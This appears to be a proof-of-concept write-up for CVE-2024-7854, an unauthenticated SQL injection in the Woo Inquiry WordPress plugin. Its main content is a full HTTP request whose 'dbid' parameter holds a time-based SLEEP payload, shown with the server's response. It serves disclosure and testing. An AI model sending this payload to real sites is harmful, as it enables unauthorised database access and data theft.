# CVE-2024-7854
Woo Inquiry &lt;= 0.1 - Unauthenticated SQL Injection

# Description:
The Woo Inquiry plugin for WordPress is vulnerable to SQL Injection in all versions up to, and including, 0.1 due to insufficient escaping on the user supplied parameter 'dbid' and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.


```
Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
CVSS VectorCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
CVE	CVE-2024-7854
CVSS	10.0 (Critical)
Publicly Published	August 20, 2024
Last Updated	August 21, 2024
Researcher	theviper17y
```


POC
---

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=your-plugin-page

action=woo_wpinq_times_up&dbid=(SELECT(0)FROM(SELECT(SLEEP(7)))a)
```

Response
---

```
HTTP/1.1 200 OK
Date: Fri, 04 Oct 2024 14:58:12 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.11
Set-Cookie: wp_woocommerce_session_e2df32a6c3e7076dd7dc7d3f3fec39aa=t_3eb3f5c6363918eab1b55150d83bbf%7C%7C1728226692%7C%7C1728223092%7C%7C4da159d85ec0f89a77b481aba5fbc74f; expires=Sun, 06 Oct 2024 14:58:12 GMT; Max-Age=172800; path=/; HttpOnly
Access-Control-Allow-Origin: http://kubernetes.docker.internal
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
````
